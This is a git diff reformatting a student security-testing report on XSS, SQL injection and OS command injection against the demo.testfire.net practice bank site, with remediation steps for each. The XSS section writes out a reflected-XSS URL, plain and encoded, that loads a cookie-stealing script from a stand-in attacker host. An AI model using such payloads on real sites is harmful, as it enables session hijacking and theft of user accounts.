@@ -1,6 +1,5 @@
-# Deliverable_Five_SecurityTesting
-
-##Author: Huizhi Zhong, Ting Li(til42)
+# IS2545 - DELIVERABLE 5: Security Testing
+## Author: Huizhi Zhong(huz25), Ting Li(til42)
 
 ## Vulnerability 1: Cross Site Scripting (Reflected)
 Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance.
@@ -11,29 +10,23 @@ Interception, modification and fabrication can exploit this vulnerability. The a
 
 If attacker didn’t get user’s username and password from the session, then it is passive as it is eavesdropping users’ activity. If attacker get user’s username and password from the session, then it is active as the attacker log in as a different user to read and write data.
 
-Business value would be lost : Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site, and the company will lose its reputation. If attacker get password of administrator, then it will cause data loss and unauthorized access.
+Business value would be lost: Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site, and the company will lose its reputation. If attacker get password of administrator, then it will cause data loss and unauthorized access.
 
-###### Steps for development team taken to fix this vulnerability:
-    1.Perform input validation and consider all potentially relevant properties, including length, type of input, 
-     the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, 
-     and conformance to business rules. Guarantee that the pages in the Web site return user inputs only after validating them for any malicious code. 
-
-    2.Convert all non-alphanumeric characters to HTML character entities before displaying 
-    the user input in search engines and forums.
-
-    3. Use testing tools extensively during the design phase to eliminate 
-    such XSS holes in the application before it goes into use.
+#### Steps for development team taken to fix this vulnerability:
+   1. Perform input validation and consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. Guarantee that the pages in the Web site return user inputs only after validating them for any malicious code. 
+   2. Convert all non-alphanumeric characters to HTML character entities before displaying the user input in search engines and forums.
+   3. Use testing tools extensively during the design phase to eliminate such XSS holes in the application before it goes into use.
 
 
 The URL of the website with the described vulnerability: http://demo.testfire.net/
 
 
 ###### Steps taken to exploit the vulnerability:
-    1. Attacker observes that http://demo.testfire.net/ website contains a reflected XSS vulnerability: User can input a search term in the search box and clicks the submit button and the url will be http://demo.testfire.net/search.aspx?txtSearch=***
-    2. The attacker crafts a URL to exploit the vulnerability by making the URL http://demo.testfire.net/search.aspx?txtSearch=searchitem<script%20src="http://mallorysevilsite.com/authstealer.js"></script> which will run the js file to grab users’ information. Then attacker encodes this URL to http://demo.testfire.net/search.aspx?txtSearch=searchitem%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E, so that user cannot immediately decipher the malicious URL.
-    3. Attacker sends the link to some unsuspecting members of this website. When user clicks on the link, it goes to the website to search, right in the middle, the script tag runs (it is invisible on the screen) and loads and runs authstealer.js (triggering the XSS attack). 
-    4. The authstealer.js program runs in user's browser, and it grabs a copy of user's Authorization Cookie and sends it to attacker's server, where attacker retrieves it.
-    5. Attacker now puts user’'s Authorization Cookie into his browser as if it were his own to log in as another user and then read and write the user’s data. Condition will be worse if attacker get administrator’s password.
+   1. Attacker observes that http://demo.testfire.net/ website contains a reflected XSS vulnerability: User can input a search term in the search box and clicks the submit button and the url will be http://demo.testfire.net/search.aspx?txtSearch=***
+   2. The attacker crafts a URL to exploit the vulnerability by making the URL http://demo.testfire.net/search.aspx?txtSearch=searchitem<script%20src="http://mallorysevilsite.com/authstealer.js"></script> which will run the js file to grab users’ information. Then attacker encodes this URL to http://demo.testfire.net/search.aspx?txtSearch=searchitem%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E, so that user cannot immediately decipher the malicious URL.
+   3. Attacker sends the link to some unsuspecting members of this website. When user clicks on the link, it goes to the website to search, right in the middle, the script tag runs (it is invisible on the screen) and loads and runs authstealer.js (triggering the XSS attack). 
+   4. The authstealer.js program runs in user's browser, and it grabs a copy of user's Authorization Cookie and sends it to attacker's server, where attacker retrieves it.
+   5. Attacker now puts user’'s Authorization Cookie into his browser as if it were his own to log in as another user and then read and write the user’s data. Condition will be worse if attacker get administrator’s password.
 
 The screenshot follows the steps of what OWASP ZAP does
 
@@ -53,13 +46,13 @@ transfer funds and change user's password (modification) and add a new user (fab
 
 Attacks that exploit this vulnerability is active because attacker log in as administrator and modify bank account information.
 
-Exploiting this vulnerability would due to data loss and unauthorized access. When attacker is able to log in as an administrator, customers’ information are stolen which will affect public image of the company and result in noticeable profit loss. 
+Business value would be lost:Exploiting this vulnerability would due to data loss and unauthorized access. When attacker is able to log in as an administrator, customers’ information are stolen which will affect public image of the company and result in noticeable profit loss. 
 
 ###### Steps for development team taken to fix this vulnerability:
-1. Adopt an input validation technique in which user input is authenticated against a set of defined rules for length, type and syntax and also against business rules.
-2. Development team should ensure that users with the permission to access the database have the least privileges. Additionally, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.
-3. Also, you should always make sure that a database user is created only for a specific application and this user is not able to access other applications. 
-4. Remove all stored procedures that are not in use. Use strongly typed parameterized query APIs with placeholder substitution markers, even when calling stored procedures. Show care when using stored procedures since they are generally safe from injection. However, be careful as they can be injectable (such as via the use of exec() or concatenating arguments within the stored procedure).
+  1. Adopt an input validation technique in which user input is authenticated against a set of defined rules for length, type and syntax and also against business rules.
+  2. Development team should ensure that users with the permission to access the database have the least privileges. Additionally, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.
+  3. Also, you should always make sure that a database user is created only for a specific application and this user is not able to access other applications. 
+  4. Remove all stored procedures that are not in use. Use strongly typed parameterized query APIs with placeholder substitution markers, even when calling stored procedures. Show care when using stored procedures since they are generally safe from injection. However, be careful as they can be injectable (such as via the use of exec() or concatenating arguments within the stored procedure).
 
 The URL of the website with the described vulnerability: http://demo.testfire.net/bank/login.aspx
 
@@ -77,7 +70,6 @@ A screenshot of the vulnerability.
 
 Vulnerability 3: Remote OS command injection
 
-
 Remote OS command injection is an attack technique that user can supply operating system commands through a web interface in order to execute OS commands on a web server. This vulnerability can seduce attack on the confidentiality and integrity of system as an attacker can inject extra shell commands and have the application run them under the privileges of the web-server, and these commands can achieve unauthorized read and write. 
 
 Interruption: Injection code to disrupt services of a host connected to the Internet, resulting in Denial-of-service attack. 
@@ -85,10 +77,10 @@ Interception: Interception, because user may obtain the password through command
 Modification: Upload malicious code which could modify or deleting data on the web server
 
 Referring to the aforementioned ways of exploiting this vulnerability, we can see the attacks can be both active and passive.  
-Business value would be lost:  Reputation damage would occur if user data is modified or deleted by attacker through os command injection. Moreover, all data could be stolen by attacker, where resides business value, which would incur financial damage.   
+Business value would be lost: Reputation damage would occur if user data is modified or deleted by attacker through os command injection. Moreover, all data could be stolen by attacker, where resides business value, which would incur financial damage.   
 
 
-Steps for development team taken to fix this vulnerability:
+#### Steps for development team taken to fix this vulnerability:
 
 1. Perform input validation by considering all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. When constructing OS command strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. 
 
